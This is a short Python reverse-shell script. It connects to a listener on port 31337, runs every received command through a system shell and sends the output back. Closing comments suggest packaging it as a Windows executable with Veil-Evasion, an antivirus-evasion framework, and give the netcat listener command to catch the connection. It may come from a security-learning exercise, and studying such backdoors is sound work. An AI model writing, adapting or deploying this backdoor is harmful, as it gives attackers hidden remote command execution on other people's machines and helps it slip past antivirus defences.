import socket
import subprocess

sockobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sockobj.connect(("127.0.0.1", 31337))

while 1:
    data = sockobj.recv(4096)  # returns a bytes object
    # print(data)
    # print(type(data))
    # print(str(data))
    # print(data.decode())
    # print(isinstance(str(data), str))

    # don't forget to decode the bytes to str
    proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                            stderr=subprocess.PIPE)
    result = proc.stdout.read()
    # print("Command result:")
    # print(result)
    sockobj.send(result)

# Veil-Evasion make .py to .exe
# auxilary/pyinstaller-wrapper
# connect to nc (Windows)
#   nc -L -p 31337 -v
